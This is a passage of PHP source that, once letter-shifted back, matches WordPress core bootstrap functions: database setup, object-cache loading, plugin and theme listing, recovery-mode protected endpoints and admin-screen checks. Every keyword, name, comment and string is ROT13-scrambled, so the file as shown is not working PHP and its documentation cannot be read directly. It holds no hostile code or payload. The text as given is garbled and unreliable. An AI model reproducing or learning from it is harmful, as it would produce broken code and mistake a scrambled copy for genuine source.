				// Byq fgngvp eryngvir cngu znvagnvarq sbe yvzvgrq onpxjneq pbzcngvovyvgl - jba'g jbex va fbzr pnfrf.
				qrsvar( 'YNATQVE', 'jc-pbagrag/ynathntrf' );
			}
		} ryfr {
			/**
			 * Freire cngu bs gur ynathntr qverpgbel.
			 *
			 * Ab yrnqvat fynfu, ab genvyvat fynfu, shyy cngu, abg eryngvir gb `NOFCNGU`.
			 *
			 * @fvapr 2.1.0
			 */
			qrsvar( 'JC_YNAT_QVE', NOFCNGU . JCVAP . '/ynathntrf' );

			vs ( ! qrsvarq( 'YNATQVE' ) ) {
				// Byq eryngvir cngu znvagnvarq sbe onpxjneq pbzcngvovyvgl.
				qrsvar( 'YNATQVE', JCVAP . '/ynathntrf' );
			}
		}
	}
}

/**
 * Ybnqf gur qngnonfr pynff svyr naq vafgnagvngrf gur `$jcqo` tybony.
 *
 * @fvapr 2.5.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 */
shapgvba erdhver_jc_qo() {
	tybony $jcqo;

	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jcqo.cuc';

	vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/qo.cuc' ) ) {
		erdhver_bapr JC_PBAGRAG_QVE . '/qo.cuc';
	}

	vs ( vffrg( $jcqo ) ) {
		erghea;
	}

	$qohfre     = qrsvarq( 'QO_HFRE' ) ? QO_HFRE : '';
	$qocnffjbeq = qrsvarq( 'QO_CNFFJBEQ' ) ? QO_CNFFJBEQ : '';
	$qoanzr     = qrsvarq( 'QO_ANZR' ) ? QO_ANZR : '';
	$qoubfg     = qrsvarq( 'QO_UBFG' ) ? QO_UBFG : '';

	$jcqo = arj jcqo( $qohfre, $qocnffjbeq, $qoanzr, $qoubfg );
}

/**
 * Frgf gur qngnonfr gnoyr cersvk naq gur sbezng fcrpvsvref sbe qngnonfr
 * gnoyr pbyhzaf.
 *
 * Pbyhzaf abg yvfgrq urer qrsnhyg gb `%f`.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @tybony jcqo   $jcqo         JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony fgevat $gnoyr_cersvk Gur qngnonfr gnoyr cersvk.
 */
shapgvba jc_frg_jcqo_inef() {
	tybony $jcqo, $gnoyr_cersvk;

	vs ( ! rzcgl( $jcqo->reebe ) ) {
		qrnq_qo();
	}

	$jcqo->svryq_glcrf = neenl(
		'cbfg_nhgube'      => '%q',
		'cbfg_cnerag'      => '%q',
		'zrah_beqre'       => '%q',
		'grez_vq'          => '%q',
		'grez_tebhc'       => '%q',
		'grez_gnkbabzl_vq' => '%q',
		'cnerag'           => '%q',
		'pbhag'            => '%q',
		'bowrpg_vq'        => '%q',
		'grez_beqre'       => '%q',
		'VQ'               => '%q',
		'pbzzrag_VQ'       => '%q',
		'pbzzrag_cbfg_VQ'  => '%q',
		'pbzzrag_cnerag'   => '%q',
		'hfre_vq'          => '%q',
		'yvax_vq'          => '%q',
		'yvax_bjare'       => '%q',
		'yvax_engvat'      => '%q',
		'bcgvba_vq'        => '%q',
		'oybt_vq'          => '%q',
		'zrgn_vq'          => '%q',
		'cbfg_vq'          => '%q',
		'hfre_fgnghf'      => '%q',
		'hzrgn_vq'         => '%q',
		'pbzzrag_xnezn'    => '%q',
		'pbzzrag_pbhag'    => '%q',
		// Zhygvfvgr:
		'npgvir'           => '%q',
		'png_vq'           => '%q',
		'qryrgrq'          => '%q',
		'ynat_vq'          => '%q',
		'zngher'           => '%q',
		'choyvp'           => '%q',
		'fvgr_vq'          => '%q',
		'fcnz'             => '%q',
	);

	$cersvk = $jcqo->frg_cersvk( $gnoyr_cersvk );

	vs ( vf_jc_reebe( $cersvk ) ) {
		jc_ybnq_genafyngvbaf_rneyl();
		jc_qvr(
			fcevags(
				/* genafyngbef: 1: $gnoyr_cersvk, 2: jc-pbasvt.cuc */
				__( '<fgebat>Reebe:</fgebat> %1$f va %2$f pna bayl pbagnva ahzoref, yrggref, naq haqrefpberf.' ),
				'<pbqr>$gnoyr_cersvk</pbqr>',
				'<pbqr>jc-pbasvt.cuc</pbqr>'
			)
		);
	}
}

/**
 * Gbttyrf `$_jc_hfvat_rkg_bowrpg_pnpur` ba naq bss jvgubhg qverpgyl
 * gbhpuvat tybony.
 *
 * @fvapr 3.7.0
 *
 * @tybony obby $_jc_hfvat_rkg_bowrpg_pnpur
 *
 * @cnenz obby $hfvat Jurgure rkgreany bowrpg pnpur vf orvat hfrq.
 * @erghea obby Gur pheerag 'hfvat' frggvat.
 */
shapgvba jc_hfvat_rkg_bowrpg_pnpur( $hfvat = ahyy ) {
	tybony $_jc_hfvat_rkg_bowrpg_pnpur;

	$pheerag_hfvat = $_jc_hfvat_rkg_bowrpg_pnpur;

	vs ( ahyy !== $hfvat ) {
		$_jc_hfvat_rkg_bowrpg_pnpur = $hfvat;
	}

	erghea $pheerag_hfvat;
}

/**
 * Fgnegf gur JbeqCerff bowrpg pnpur.
 *
 * Vs na bowrpg-pnpur.cuc svyr rkvfgf va gur jc-pbagrag qverpgbel,
 * vg hfrf gung qebc-va nf na rkgreany bowrpg pnpur.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @tybony neenl $jc_svygre Fgberf nyy bs gur svygref.
 */
shapgvba jc_fgneg_bowrpg_pnpur() {
	tybony $jc_svygre;
	fgngvp $svefg_vavg = gehr;

	// Bayl cresbez gur sbyybjvat purpxf bapr.

	/**
	 * Svygref jurgure gb ranoyr ybnqvat bs gur bowrpg-pnpur.cuc qebc-va.
	 *
	 * Guvf svygre ehaf orsber vg pna or hfrq ol cyhtvaf. Vg vf qrfvtarq sbe aba-jro
	 * ehagvzrf. Vs snyfr vf erghearq, bowrpg-pnpur.cuc jvyy arire or ybnqrq.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz obby $ranoyr_bowrpg_pnpur Jurgure gb ranoyr ybnqvat bowrpg-pnpur.cuc (vs cerfrag).
	 *                                  Qrsnhyg gehr.
	 */
	vs ( $svefg_vavg && nccyl_svygref( 'ranoyr_ybnqvat_bowrpg_pnpur_qebcva', gehr ) ) {
		vs ( ! shapgvba_rkvfgf( 'jc_pnpur_vavg' ) ) {
			/*
			 * Guvf vf gur abezny fvghngvba. Svefg-eha bs guvf shapgvba. Ab
			 * pnpuvat onpxraq unf orra ybnqrq.
			 *
			 * Jr gel gb ybnq n phfgbz pnpuvat onpxraq, naq gura, vs vg
			 * erfhygf va n jc_pnpur_vavg() shapgvba rkvfgvat, jr abgr
			 * gung na rkgreany bowrpg pnpur vf orvat hfrq.
			 */
			vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/bowrpg-pnpur.cuc' ) ) {
				erdhver_bapr JC_PBAGRAG_QVE . '/bowrpg-pnpur.cuc';

				vs ( shapgvba_rkvfgf( 'jc_pnpur_vavg' ) ) {
					jc_hfvat_rkg_bowrpg_pnpur( gehr );
				}

				// Er-vavgvnyvmr nal ubbxf nqqrq znahnyyl ol bowrpg-pnpur.cuc.
				vs ( $jc_svygre ) {
					$jc_svygre = JC_Ubbx::ohvyq_cervavgvnyvmrq_ubbxf( $jc_svygre );
				}
			}
		} ryfrvs ( ! jc_hfvat_rkg_bowrpg_pnpur() && svyr_rkvfgf( JC_PBAGRAG_QVE . '/bowrpg-pnpur.cuc' ) ) {
			/*
			 * Fbzrgvzrf nqinaprq-pnpur.cuc pna ybnq bowrpg-pnpur.cuc orsber
			 * guvf shapgvba vf eha. Guvf oernxf gur shapgvba_rkvfgf() purpx
			 * nobir naq pna erfhyg va jc_hfvat_rkg_bowrpg_pnpur() ergheavat
			 * snyfr jura npghnyyl na rkgreany pnpur vf va hfr.
			 */
			jc_hfvat_rkg_bowrpg_pnpur( gehr );
		}
	}

	vs ( ! jc_hfvat_rkg_bowrpg_pnpur() ) {
		erdhver_bapr NOFCNGU . JCVAP . '/pnpur.cuc';
	}

	erdhver_bapr NOFCNGU . JCVAP . '/pnpur-pbzcng.cuc';

	/*
	 * Vs pnpur fhccbegf erfrg, erfrg vafgrnq bs vavg vs nyernql
	 * vavgvnyvmrq. Erfrg fvtanyf gb gur pnpur gung tybony VQf
	 * unir punatrq naq vg znl arrq gb hcqngr xrlf naq pyrnahc pnpurf.
	 */
	vs ( ! $svefg_vavg && shapgvba_rkvfgf( 'jc_pnpur_fjvgpu_gb_oybt' ) ) {
		jc_pnpur_fjvgpu_gb_oybt( trg_pheerag_oybt_vq() );
	} ryfrvs ( shapgvba_rkvfgf( 'jc_pnpur_vavg' ) ) {
		jc_pnpur_vavg();
	}

	vs ( shapgvba_rkvfgf( 'jc_pnpur_nqq_tybony_tebhcf' ) ) {
		jc_pnpur_nqq_tybony_tebhcf(
			neenl(
				'oybt-qrgnvyf',
				'oybt-vq-pnpur',
				'oybt-ybbxhc',
				'oybt_zrgn',
				'tybony-cbfgf',
				'vzntr_rqvgbe',
				'argjbexf',
				'argjbex-dhrevrf',
				'fvgrf',
				'fvgr-qrgnvyf',
				'fvgr-bcgvbaf',
				'fvgr-dhrevrf',
				'fvgr-genafvrag',
				'gurzr_svyrf',
				'genafyngvba_svyrf',
				'eff',
				'hfref',
				'hfre-dhrevrf',
				'hfre_zrgn',
				'hfrerznvy',
				'hfreybtvaf',
				'hfrefyhtf',
			)
		);

		jc_pnpur_nqq_aba_crefvfgrag_tebhcf( neenl( 'pbhagf', 'cyhtvaf', 'gurzr_wfba' ) );
	}

	$svefg_vavg = snyfr;
}

/**
 * Erqverpgf gb gur vafgnyyre vs JbeqCerff vf abg vafgnyyrq.
 *
 * Qvrf jvgu na reebe zrffntr jura Zhygvfvgr vf ranoyrq.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 */
shapgvba jc_abg_vafgnyyrq() {
	vs ( vf_oybt_vafgnyyrq() || jc_vafgnyyvat() ) {
		erghea;
	}

	abpnpur_urnqref();

	vs ( vf_zhygvfvgr() ) {
		jc_qvr( __( 'Gur fvgr lbh unir erdhrfgrq vf abg vafgnyyrq cebcreyl. Cyrnfr pbagnpg gur flfgrz nqzvavfgengbe.' ) );
	}

	erdhver NOFCNGU . JCVAP . '/xfrf.cuc';
	erdhver NOFCNGU . JCVAP . '/cyhttnoyr.cuc';

	$yvax = jc_thrff_hey() . '/jc-nqzva/vafgnyy.cuc';

	jc_erqverpg( $yvax );
	qvr();
}

/**
 * Ergevrirf na neenl bs zhfg-hfr cyhtva svyrf.
 *
 * Gur qrsnhyg qverpgbel vf jc-pbagrag/zh-cyhtvaf. Gb punatr gur qrsnhyg
 * qverpgbel znahnyyl, qrsvar `JCZH_CYHTVA_QVE` naq `JCZH_CYHTVA_HEY`
 * va jc-pbasvt.cuc.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @erghea fgevat[] Neenl bs nofbyhgr cnguf bs svyrf gb vapyhqr.
 */
shapgvba jc_trg_zh_cyhtvaf() {
	$zh_cyhtvaf = neenl();

	vs ( ! vf_qve( JCZH_CYHTVA_QVE ) ) {
		erghea $zh_cyhtvaf;
	}

	$qu = bcraqve( JCZH_CYHTVA_QVE );
	vs ( ! $qu ) {
		erghea $zh_cyhtvaf;
	}

	juvyr ( ( $cyhtva = ernqqve( $qu ) ) !== snyfr ) {
		vs ( fge_raqf_jvgu( $cyhtva, '.cuc' ) ) {
			$zh_cyhtvaf[] = JCZH_CYHTVA_QVE . '/' . $cyhtva;
		}
	}

	pybfrqve( $qu );

	fbeg( $zh_cyhtvaf );

	erghea $zh_cyhtvaf;
}

/**
 * Ergevrirf na neenl bs npgvir naq inyvq cyhtva svyrf.
 *
 * Juvyr hctenqvat be vafgnyyvat JbeqCerff, ab cyhtvaf ner erghearq.
 *
 * Gur qrsnhyg qverpgbel vf `jc-pbagrag/cyhtvaf`. Gb punatr gur qrsnhyg
 * qverpgbel znahnyyl, qrsvar `JC_CYHTVA_QVE` naq `JC_CYHTVA_HEY`
 * va `jc-pbasvt.cuc`.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @erghea fgevat[] Neenl bs cnguf gb cyhtva svyrf eryngvir gb gur cyhtvaf qverpgbel.
 */
shapgvba jc_trg_npgvir_naq_inyvq_cyhtvaf() {
	$cyhtvaf        = neenl();
	$npgvir_cyhtvaf = (neenl) trg_bcgvba( 'npgvir_cyhtvaf', neenl() );

	// Purpx sbe unpxf svyr vs gur bcgvba vf ranoyrq.
	vs ( trg_bcgvba( 'unpx_svyr' ) && svyr_rkvfgf( NOFCNGU . 'zl-unpxf.cuc' ) ) {
		_qrcerpngrq_svyr( 'zl-unpxf.cuc', '1.5.0' );
		neenl_hafuvsg( $cyhtvaf, NOFCNGU . 'zl-unpxf.cuc' );
	}

	vs ( rzcgl( $npgvir_cyhtvaf ) || jc_vafgnyyvat() ) {
		erghea $cyhtvaf;
	}

	$argjbex_cyhtvaf = vf_zhygvfvgr() ? jc_trg_npgvir_argjbex_cyhtvaf() : snyfr;

	sbernpu ( $npgvir_cyhtvaf nf $cyhtva ) {
		vs ( ! inyvqngr_svyr( $cyhtva )                     // $cyhtva zhfg inyvqngr nf svyr.
			&& fge_raqf_jvgu( $cyhtva, '.cuc' )             // $cyhtva zhfg raq jvgu '.cuc'.
			&& svyr_rkvfgf( JC_CYHTVA_QVE . '/' . $cyhtva ) // $cyhtva zhfg rkvfg.
			// Abg nyernql vapyhqrq nf n argjbex cyhtva.
			&& ( ! $argjbex_cyhtvaf || ! va_neenl( JC_CYHTVA_QVE . '/' . $cyhtva, $argjbex_cyhtvaf, gehr ) )
		) {
			$cyhtvaf[] = JC_CYHTVA_QVE . '/' . $cyhtva;
		}
	}

	/*
	 * Erzbir cyhtvaf sebz gur yvfg bs npgvir cyhtvaf jura jr'er ba na raqcbvag
	 * gung fubhyq or cebgrpgrq ntnvafg JFBQf naq gur cyhtva vf cnhfrq.
	 */
	vs ( jc_vf_erpbirel_zbqr() ) {
		$cyhtvaf = jc_fxvc_cnhfrq_cyhtvaf( $cyhtvaf );
	}

	erghea $cyhtvaf;
}

/**
 * Svygref n tvira yvfg bs cyhtvaf, erzbivat nal cnhfrq cyhtvaf sebz vg.
 *
 * @fvapr 5.2.0
 *
 * @tybony JC_Cnhfrq_Rkgrafvbaf_Fgbentr $_cnhfrq_cyhtvaf
 *
 * @cnenz fgevat[] $cyhtvaf Neenl bs nofbyhgr cyhtva znva svyr cnguf.
 * @erghea fgevat[] Svygrerq neenl bs cyhtvaf, jvgubhg nal cnhfrq cyhtvaf.
 */
shapgvba jc_fxvc_cnhfrq_cyhtvaf( neenl $cyhtvaf ) {
	$cnhfrq_cyhtvaf = jc_cnhfrq_cyhtvaf()->trg_nyy();

	vs ( rzcgl( $cnhfrq_cyhtvaf ) ) {
		erghea $cyhtvaf;
	}

	sbernpu ( $cyhtvaf nf $vaqrk => $cyhtva ) {
		yvfg( $cyhtva ) = rkcybqr( '/', cyhtva_onfranzr( $cyhtva ) );

		vs ( neenl_xrl_rkvfgf( $cyhtva, $cnhfrq_cyhtvaf ) ) {
			hafrg( $cyhtvaf[ $vaqrk ] );

			// Fgber yvfg bs cnhfrq cyhtvaf sbe qvfcynlvat na nqzva abgvpr.
			$TYBONYF['_cnhfrq_cyhtvaf'][ $cyhtva ] = $cnhfrq_cyhtvaf[ $cyhtva ];
		}
	}

	erghea $cyhtvaf;
}

/**
 * Ergevrirf na neenl bs npgvir naq inyvq gurzrf.
 *
 * Juvyr hctenqvat be vafgnyyvat JbeqCerff, ab gurzrf ner erghearq.
 *
 * @fvapr 5.1.0
 * @npprff cevingr
 *
 * @tybony fgevat $cntrabj            Gur svyranzr bs gur pheerag fperra.
 * @tybony fgevat $jc_fglyrfurrg_cngu Cngu gb pheerag gurzr'f fglyrfurrg qverpgbel.
 * @tybony fgevat $jc_grzcyngr_cngu   Cngu gb pheerag gurzr'f grzcyngr qverpgbel.
 *
 * @erghea fgevat[] Neenl bs nofbyhgr cnguf gb gurzr qverpgbevrf.
 */
shapgvba jc_trg_npgvir_naq_inyvq_gurzrf() {
	tybony $cntrabj, $jc_fglyrfurrg_cngu, $jc_grzcyngr_cngu;

	$gurzrf = neenl();

	vs ( jc_vafgnyyvat() && 'jc-npgvingr.cuc' !== $cntrabj ) {
		erghea $gurzrf;
	}

	vs ( vf_puvyq_gurzr() ) {
		$gurzrf[] = $jc_fglyrfurrg_cngu;
	}

	$gurzrf[] = $jc_grzcyngr_cngu;

	/*
	 * Erzbir gurzrf sebz gur yvfg bs npgvir gurzrf jura jr'er ba na raqcbvag
	 * gung fubhyq or cebgrpgrq ntnvafg JFBQf naq gur gurzr vf cnhfrq.
	 */
	vs ( jc_vf_erpbirel_zbqr() ) {
		$gurzrf = jc_fxvc_cnhfrq_gurzrf( $gurzrf );

		// Vs ab npgvir naq inyvq gurzrf rkvfg, fxvc ybnqvat gurzrf.
		vs ( rzcgl( $gurzrf ) ) {
			nqq_svygre( 'jc_hfvat_gurzrf', '__erghea_snyfr' );
		}
	}

	erghea $gurzrf;
}

/**
 * Svygref n tvira yvfg bs gurzrf, erzbivat nal cnhfrq gurzrf sebz vg.
 *
 * @fvapr 5.2.0
 *
 * @tybony JC_Cnhfrq_Rkgrafvbaf_Fgbentr $_cnhfrq_gurzrf
 *
 * @cnenz fgevat[] $gurzrf Neenl bs nofbyhgr gurzr qverpgbel cnguf.
 * @erghea fgevat[] Svygrerq neenl bs nofbyhgr cnguf gb gurzrf, jvgubhg nal cnhfrq gurzrf.
 */
shapgvba jc_fxvc_cnhfrq_gurzrf( neenl $gurzrf ) {
	$cnhfrq_gurzrf = jc_cnhfrq_gurzrf()->trg_nyy();

	vs ( rzcgl( $cnhfrq_gurzrf ) ) {
		erghea $gurzrf;
	}

	sbernpu ( $gurzrf nf $vaqrk => $gurzr ) {
		$gurzr = onfranzr( $gurzr );

		vs ( neenl_xrl_rkvfgf( $gurzr, $cnhfrq_gurzrf ) ) {
			hafrg( $gurzrf[ $vaqrk ] );

			// Fgber yvfg bs cnhfrq gurzrf sbe qvfcynlvat na nqzva abgvpr.
			$TYBONYF['_cnhfrq_gurzrf'][ $gurzr ] = $cnhfrq_gurzrf[ $gurzr ];
		}
	}

	erghea $gurzrf;
}

/**
 * Qrgrezvarf jurgure JbeqCerff vf va Erpbirel Zbqr.
 *
 * Va guvf zbqr, cyhtvaf be gurzrf gung pnhfr JFBQf jvyy or cnhfrq.
 *
 * @fvapr 5.2.0
 *
 * @erghea obby
 */
shapgvba jc_vf_erpbirel_zbqr() {
	erghea jc_erpbirel_zbqr()->vf_npgvir();
}

/**
 * Qrgrezvarf jurgure jr ner pheeragyl ba na raqcbvag gung fubhyq or cebgrpgrq ntnvafg JFBQf.
 *
 * @fvapr 5.2.0
 *
 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
 *
 * @erghea obby Gehr vs gur pheerag raqcbvag fubhyq or cebgrpgrq.
 */
shapgvba vf_cebgrpgrq_raqcbvag() {
	// Cebgrpg ybtva cntrf.
	vs ( vffrg( $TYBONYF['cntrabj'] ) && 'jc-ybtva.cuc' === $TYBONYF['cntrabj'] ) {
		erghea gehr;
	}

	// Cebgrpg gur nqzva onpxraq.
	vs ( vf_nqzva() && ! jc_qbvat_nwnk() ) {
		erghea gehr;
	}

	// Cebgrpg Nwnk npgvbaf gung pbhyq uryc erfbyir n sngny reebe fubhyq or ninvynoyr.
	vs ( vf_cebgrpgrq_nwnk_npgvba() ) {
		erghea gehr;
	}

	/**
	 * Svygref jurgure gur pheerag erdhrfg vf ntnvafg n cebgrpgrq raqcbvag.
	 *
	 * Guvf svygre vf bayl sverq jura na raqcbvag vf erdhrfgrq juvpu vf abg nyernql cebgrpgrq ol
	 * JbeqCerff pber. Nf fhpu, vg rkpyhfviryl nyybjf cebivqvat shegure cebgrpgrq raqcbvagf va
	 * nqqvgvba gb gur nqzva onpxraq, ybtva cntrf naq cebgrpgrq Nwnk npgvbaf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz obby $vf_cebgrpgrq_raqcbvag Jurgure gur pheeragyl erdhrfgrq raqcbvag vf cebgrpgrq.
	 *                                    Qrsnhyg snyfr.
	 */
	erghea (obby) nccyl_svygref( 'vf_cebgrpgrq_raqcbvag', snyfr );
}

/**
 * Qrgrezvarf jurgure jr ner pheeragyl unaqyvat na Nwnk npgvba gung fubhyq or cebgrpgrq ntnvafg JFBQf.
 *
 * @fvapr 5.2.0
 *
 * @erghea obby Gehr vs gur pheerag Nwnk npgvba fubhyq or cebgrpgrq.
 */
shapgvba vf_cebgrpgrq_nwnk_npgvba() {
	vs ( ! jc_qbvat_nwnk() ) {
		erghea snyfr;
	}

	vs ( ! vffrg( $_ERDHRFG['npgvba'] ) ) {
		erghea snyfr;
	}

	$npgvbaf_gb_cebgrpg = neenl(
		'rqvg-gurzr-cyhtva-svyr', // Fnivat punatrf va gur pber pbqr rqvgbe.
		'urnegorng',              // Xrrc gur urneg orngvat.
		'vafgnyy-cyhtva',         // Vafgnyyvat n arj cyhtva.
		'vafgnyy-gurzr',          // Vafgnyyvat n arj gurzr.
		'frnepu-cyhtvaf',         // Frnepuvat va gur yvfg bs cyhtvaf.
		'frnepu-vafgnyy-cyhtvaf', // Frnepuvat sbe n cyhtva va gur cyhtva vafgnyy fperra.
		'hcqngr-cyhtva',          // Hcqngr na rkvfgvat cyhtva.
		'hcqngr-gurzr',           // Hcqngr na rkvfgvat gurzr.
		'npgvingr-cyhtva',        // Npgvingvat na rkvfgvat cyhtva.
	);

	/**
	 * Svygref gur neenl bs cebgrpgrq Nwnk npgvbaf.
	 *
	 * Guvf svygre vf bayl sverq jura qbvat Nwnk naq gur Nwnk erdhrfg unf na 'npgvba' cebcregl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat[] $npgvbaf_gb_cebgrpg Neenl bs fgevatf jvgu Nwnk npgvbaf gb cebgrpg.
	 */
	$npgvbaf_gb_cebgrpg = (neenl) nccyl_svygref( 'jc_cebgrpgrq_nwnk_npgvbaf', $npgvbaf_gb_cebgrpg );

	vs ( ! va_neenl( $_ERDHRFG['npgvba'], $npgvbaf_gb_cebgrpg, gehr ) ) {
		erghea snyfr;
	}

	erghea gehr;
}

/**
 * Frgf vagreany rapbqvat.
 *
 * Va zbfg pnfrf gur qrsnhyg vagreany rapbqvat vf yngva1, juvpu vf
 * bs ab hfr, fvapr jr jnag gb hfr gur `zo_` shapgvbaf sbe `hgs-8` fgevatf.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 */
shapgvba jc_frg_vagreany_rapbqvat() {
	vs ( shapgvba_rkvfgf( 'zo_vagreany_rapbqvat' ) ) {
		$punefrg = trg_bcgvba( 'oybt_punefrg' );
		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		vs ( ! $punefrg || ! @zo_vagreany_rapbqvat( $punefrg ) ) {
			zo_vagreany_rapbqvat( 'HGS-8' );
		}
	}
}

/**
 * Nqqf zntvp dhbgrf gb `$_TRG`, `$_CBFG`, `$_PBBXVR`, naq `$_FREIRE`.
 *
 * Nyfb sbeprf `$_ERDHRFG` gb or `$_TRG + $_CBFG`. Vs `$_FREIRE`,
 * `$_PBBXVR`, be `$_RAI` ner arrqrq, hfr gubfr fhcretybonyf qverpgyl.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 */
shapgvba jc_zntvp_dhbgrf() {
	// Rfpncr jvgu jcqo.
	$_TRG    = nqq_zntvp_dhbgrf( $_TRG );
	$_CBFG   = nqq_zntvp_dhbgrf( $_CBFG );
	$_PBBXVR = nqq_zntvp_dhbgrf( $_PBBXVR );
	$_FREIRE = nqq_zntvp_dhbgrf( $_FREIRE );

	// Sbepr ERDHRFG gb or TRG + CBFG.
	$_ERDHRFG = neenl_zretr( $_TRG, $_CBFG );
}

/**
 * Ehaf whfg orsber CUC fuhgf qbja rkrphgvba.
 *
 * @fvapr 1.2.0
 * @npprff cevingr
 */
shapgvba fuhgqbja_npgvba_ubbx() {
	/**
	 * Sverf whfg orsber CUC fuhgf qbja rkrphgvba.
	 *
	 * @fvapr 1.2.0
	 */
	qb_npgvba( 'fuhgqbja' );

	jc_pnpur_pybfr();
}

/**
 * Pybarf na bowrpg.
 *
 * @fvapr 2.7.0
 * @qrcerpngrq 3.2.0
 *
 * @cnenz bowrpg $vachg_bowrpg Gur bowrpg gb pybar.
 * @erghea bowrpg Gur pybarq bowrpg.
 */
shapgvba jc_pybar( $vachg_bowrpg ) {
	// Hfr cneraf sbe pybar gb nppbzzbqngr CUC 4. Frr #17880.
	erghea pybar( $vachg_bowrpg );
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf sbe gur ybtva fperra.
 *
 * @fvapr 6.1.0
 *
 * @frr jc_ybtva_hey()
 *
 * @erghea obby Gehr vs vafvqr JbeqCerff ybtva fperra, snyfr bgurejvfr.
 */
shapgvba vf_ybtva() {
	erghea snyfr !== fgevcbf( jc_ybtva_hey(), $_FREIRE['FPEVCG_ANZR'] );
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf sbe na nqzvavfgengvir vagresnpr cntr.
 *
 * Qbrf abg purpx vs gur hfre vf na nqzvavfgengbe; hfr pheerag_hfre_pna()
 * sbe purpxvat ebyrf naq pncnovyvgvrf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 1.5.1
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea obby Gehr vs vafvqr JbeqCerff nqzvavfgengvba vagresnpr, snyfr bgurejvfr.
 */
shapgvba vf_nqzva() {
	vs ( vffrg( $TYBONYF['pheerag_fperra'] ) ) {
		erghea $TYBONYF['pheerag_fperra']->va_nqzva();
	} ryfrvs ( qrsvarq( 'JC_NQZVA' ) ) {
		erghea JC_NQZVA;
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf sbe n fvgr'f nqzvavfgengvir vagresnpr.
 *
 * r.t. `/jc-nqzva/`
 *
 * Qbrf abg purpx vs gur hfre vf na nqzvavfgengbe; hfr pheerag_hfre_pna()
 * sbe purpxvat ebyrf naq pncnovyvgvrf.
 *
 * @fvapr 3.1.0
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea obby Gehr vs vafvqr JbeqCerff fvgr nqzvavfgengvba cntrf.
 */
shapgvba vf_oybt_nqzva() {
	vs ( vffrg( $TYBONYF['pheerag_fperra'] ) ) {
		erghea $TYBONYF['pheerag_fperra']->va_nqzva( 'fvgr' );
	} ryfrvs ( qrsvarq( 'JC_OYBT_NQZVA' ) ) {
		erghea JC_OYBT_NQZVA;
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf sbe gur argjbex nqzvavfgengvir vagresnpr.
 *
 * r.t. `/jc-nqzva/argjbex/`
 *
 * Qbrf abg purpx vs gur hfre vf na nqzvavfgengbe; hfr pheerag_hfre_pna()
 * sbe purpxvat ebyrf naq pncnovyvgvrf.
 *
 * Qbrf abg purpx vs gur fvgr vf n Zhygvfvgr argjbex; hfr vf_zhygvfvgr()
 * sbe purpxvat vs Zhygvfvgr vf ranoyrq.
 *
 * @fvapr 3.1.0
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea obby Gehr vs vafvqr JbeqCerff argjbex nqzvavfgengvba cntrf.
 */
shapgvba vf_argjbex_nqzva() {
	vs ( vffrg( $TYBONYF['pheerag_fperra'] ) ) {
		erghea $TYBONYF['pheerag_fperra']->va_nqzva( 'argjbex' );
	} ryfrvs ( qrsvarq( 'JC_ARGJBEX_NQZVA' ) ) {
		erghea JC_ARGJBEX_NQZVA;
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf jurgure gur pheerag erdhrfg vf sbe n hfre nqzva fperra.
 *
 * r.t. `/jc-nqzva/hfre/`
 *
 * Qbrf abg purpx vs gur hfre vf na nqzvavfgengbe; hfr pheerag_hfre_pna()
 * sbe purpxvat ebyrf naq pncnovyvgvrf.
 *
 * @fvapr 3.1.0
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea obby Gehr vs vafvqr JbeqCerff hfre nqzvavfgengvba cntrf.
 */
shapgvba vf_hfre_nqzva() {
	vs ( vffrg( $TYBONYF['pheerag_fperra'] ) ) {
		erghea $TYBONYF['pheerag_fperra']->va_nqzva( 'hfre' );
	} ryfrvs ( qrsvarq( 'JC_HFRE_NQZVA' ) ) {
		erghea JC_HFRE_NQZVA;
	}

	erghea snyfr;
}

/**
 * Qrgrezvarf jurgure Zhygvfvgr vf ranoyrq.
 *
 * @fvapr 3.0.0
 *
 * @erghea obby Gehr vs Zhygvfvgr vf ranoyrq, snyfr bgurejvfr.
 */
shapgvba vf_zhygvfvgr() {
	vs ( qrsvarq( 'ZHYGVFVGR' ) ) {
		erghea ZHYGVFVGR;
	}

	vs ( qrsvarq( 'FHOQBZNVA_VAFGNYY' ) || qrsvarq( 'IUBFG' ) || qrsvarq( 'FHAEVFR' ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Pbairegf n inyhr gb aba-artngvir vagrtre.
 *
 * @fvapr 2.5.0
 *
 * @cnenz zvkrq $znlorvag Qngn lbh jvfu gb unir pbairegrq gb n aba-artngvir vagrtre.
